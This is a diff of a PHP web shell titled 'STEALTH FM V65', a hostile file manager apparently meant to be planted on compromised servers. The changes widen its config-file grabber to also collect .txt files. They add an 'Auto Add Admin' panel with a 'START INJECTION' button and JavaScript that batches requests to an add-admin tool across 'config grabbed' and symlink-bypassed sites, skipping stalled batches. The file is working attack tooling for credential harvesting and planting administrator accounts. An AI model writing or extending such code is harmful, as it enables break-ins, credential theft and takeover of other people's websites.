@@ -1,4 +1,3 @@
-
 <?php
 // -------------------------------------------------------------------------
 // STEALTH FM V65 (ULTIMATE: JAILBREAK + ANTI-LOOP + HYBRID BYPASS)
@@ -600,7 +599,12 @@ if (isset($_SERVER[$h_act])) {
             $scan_path = is_dir($target . '/' . $target_sub) ? $target . '/' . $target_sub : $target;
             $all_files = scandir($scan_path);
             $config_files = [];
-            foreach($all_files as $f) { if($f == '.' || $f == '..') continue; if(stripos($f, 'config') !== false || stripos($f, 'settings') !== false) $config_files[] = $scan_path . '/' . $f; }
+            foreach($all_files as $f) { 
+             if($f == '.' || $f == '..') continue; 
+              if(stripos($f, 'config') !== false || stripos($f, 'settings') !== false || substr($f, -4) === '.txt') {
+               $config_files[] = $scan_path . '/' . $f; 
+            }
+              }            
             $total = count($config_files);
             if ($step >= $total) { echo json_encode(['status'=>'done', 'html'=>'', 'total'=>$total]); exit; }
             $batch_files = array_slice($config_files, $step, $limit);
@@ -1324,6 +1328,9 @@ if (isset($_SERVER[$h_act])) {
                     <div class="tool-cmd" onclick="showMassUpload()"><div class="cmd-left"><i class="fas fa-rocket cmd-icon c-purple"></i><span class="cmd-text">SMART MASS UPLOAD</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
 
                     <div class="tool-cmd" onclick="openScanSite()"><div class="cmd-left"><i class="fas fa-satellite-dish cmd-icon c-cyan"></i><span class="cmd-text">SCAN SITE</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
+                
+                    <div class="tool-cmd" onclick="openAddAdminUI()"><div class="cmd-left"><i class="fas fa-user-shield cmd-icon c-lime"></i><span class="cmd-text">AUTO ADD ADMIN GUI</span></div><i class="fas fa-arrow-right cmd-arrow"></i>
+                   </div>
                 </div>
             </div>
         </div>
@@ -1363,6 +1370,47 @@ if (isset($_SERVER[$h_act])) {
                 </div>
                 <div id="scan-result-body" class="p-3" style="max-height: 60vh; overflow-y: auto;">
                     </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal fade" id="addAdminModal" tabindex="-1">
+    <div class="modal-dialog modal-dialog-centered modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h6 class="modal-title text-white"><i class="fas fa-user-shield me-2 text-warning"></i> Auto Add Admin</h6>
+                <button class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body p-4">
+                <div class="row g-3 align-items-center mb-4">
+                    <div class="col-auto">
+                        <label class="col-form-label text-secondary">Target Folder:</label>
+                    </div>
+                    <div class="col">
+                        <select id="admin-target-select" class="form-select form-select-sm bg-dark text-light border-secondary">
+                            <option value="jumping">Jumping (Config Grabbed)</option>
+                            <option value="symlink">Symlink (3x_sym)</option>
+                        </select>
+                    </div>
+                    <div class="col-auto">
+                        <button class="btn btn-sm btn-upload-modern px-4" onclick="startAddAdminTask()">
+                            <i class="fas fa-play me-1"></i> START INJECTION
+                        </button>
+                    </div>
+                </div>
+
+                <div class="progress-bar-bg mb-2" style="height:4px;"><div class="progress-bar-fill" id="admin-prog" style="width:0%"></div></div>
+                <div class="d-flex justify-content-between small text-secondary mb-3">
+                    <span id="admin-status-txt">Ready to inject.</span>
+                    <span>Processed: <b class="text-white" id="admin-processed">0</b> / <span id="admin-total">0</span></span>
+                </div>
+
+                <div id="admin-result-body" class="p-3 bg-dark border border-secondary rounded" style="max-height: 50vh; overflow-y: auto; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem;">
+                    <div class="text-center text-secondary py-5 opacity-50">
+                        <i class="fas fa-robot fa-3x mb-3"></i><br>Results will appear here...
+                    </div>
+                </div>
             </div>
         </div>
     </div>
@@ -1785,14 +1833,113 @@ if (isset($_SERVER[$h_act])) {
             logMsg("Root Bypass Executed. (Check folder 'symlinkbypass')", "text-success");
             log.innerHTML += "<hr class='border-secondary'>";
 
-            // 5. ADD ADMIN
-            logMsg("5. Running Add Admin Scanner...", "text-warning");
-            runWatchdogTool('add_admin', 0, 'jumping');
+            logMsg("Auto Chain Done. Use Toolkit for Add Admin.", "text-success");
 
         } catch (e) {
             logMsg("CHAIN ERROR: " + e, "text-danger");
         }
     }
+    
+    // --- LOGIKA BARU ADD ADMIN GUI ---
+const addAdminModal = new bootstrap.Modal(document.getElementById('addAdminModal'));
+
+function openAddAdminUI() {
+    toolsModal.hide(); // Tutup menu toolkit
+    // Reset tampilan
+    document.getElementById('admin-result-body').innerHTML = '<div class="text-center text-secondary py-5 opacity-50"><i class="fas fa-robot fa-3x mb-3"></i><br>Results will appear here...</div>';
+    document.getElementById('admin-prog').style.width = '0%';
+    document.getElementById('admin-processed').innerText = '0';
+    document.getElementById('admin-total').innerText = '0';
+    document.getElementById('admin-status-txt').innerText = 'Ready.';
+    addAdminModal.show();
+}
+
+function startAddAdminTask() {
+    const mode = document.getElementById('admin-target-select').value;
+    const resBody = document.getElementById('admin-result-body');
+    
+    // Kunci tombol agar tidak dobel klik
+    document.getElementById('admin-status-txt').innerHTML = '<span class="text-warning"><i class="fas fa-spinner fa-spin me-2"></i>Scanning...</span>';
+    resBody.innerHTML = ''; // Bersihkan log awal
+    
+    processAdminBatch(0, mode);
+}
+
+// --- FUNGSI PROSES DENGAN WATCHDOG (ANTI-MACET) ---
+function processAdminBatch(step, mode) {
+    const limit = 5; // Sesuai dengan limit di PHP backend
+    const timeoutSeconds = 15000; // 15 Detik batas waktu per batch
+
+    // 1. Setup Watchdog (Pengaman)
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => {
+        controller.abort(); // Matikan paksa request jika macet
+        
+        // Update UI info macet
+        document.getElementById('admin-status-txt').innerHTML = `<span class="text-danger"><i class="fas fa-exclamation-triangle"></i> Timeout at #${step}. Skipping...</span>`;
+        
+        // REKURSI PENTING: Lompati batch ini (step + limit) dan lanjut scan
+        processAdminBatch(step + limit, mode); 
+    }, timeoutSeconds);
+
+    // 2. Request ke Backend
+    // Perhatikan penambahan 'signal: controller.signal' untuk menghubungkan watchdog
+    api('tool', currentPath, 'GET', {
+        'X-Tool': 'add_admin',
+        'X-Step': step,
+        'X-Mode': mode
+    }, null, controller.signal) // <--- SIGNAL WATCHDOG
+    .then(r => r.json())
+    .then(res => {
+        clearTimeout(timeoutId); // Matikan timer jika sukses sebelum 15 detik
+
+        const resBody = document.getElementById('admin-result-body');
+        
+        // Update Total
+        if (res.total) document.getElementById('admin-total').innerText = res.total;
+        
+        // Tampilkan HTML hasil injeksi
+        if (res.html) {
+            resBody.innerHTML += res.html;
+            resBody.scrollTop = resBody.scrollHeight;
+        }
+
+        // Update Progress Bar
+        let currentPos = res.current || (step + limit);
+        let pct = (res.total > 0) ? Math.round(currentPos / res.total * 100) : 0;
+        if(pct > 100) pct = 100;
+        
+        document.getElementById('admin-prog').style.width = pct + '%';
+        document.getElementById('admin-processed').innerText = Math.min(currentPos, res.total || 0);
+
+        // Logika Lanjut atau Selesai
+        if (res.status === 'continue') {
+            document.getElementById('admin-status-txt').innerHTML = `<span class="text-info"><i class="fas fa-sync fa-spin"></i> Processing ${res.next_step}...</span>`;
+            processAdminBatch(res.next_step, mode);
+        } else {
+            // SELESAI
+            document.getElementById('admin-prog').style.width = '100%';
+            document.getElementById('admin-status-txt').innerHTML = '<span class="text-success fw-bold"><i class="fas fa-check-circle me-2"></i>COMPLETED</span>';
+            showToast('Add Admin Process Finished!', 'success');
+        }
+    })
+    .catch(e => {
+        // Handle Error (Termasuk Timeout)
+        if (e.name === 'AbortError') {
+            // Ini terjadi karena kita abort manual di setTimeout, biarkan fungsi timeout yang menangani skip
+            return; 
+        }
+
+        // Jika error jaringan lain (bukan timeout), kita tetap skip agar tidak stop total
+        clearTimeout(timeoutId);
+        document.getElementById('admin-status-txt').innerHTML = `<span class="text-danger">Net Error at #${step}. Retrying next...</span>`;
+        
+        // LOMPATI BATCH MACET
+        setTimeout(() => {
+            processAdminBatch(step + limit, mode);
+        }, 1000);
+    });
+}
     
     loadDir('');
 </script>
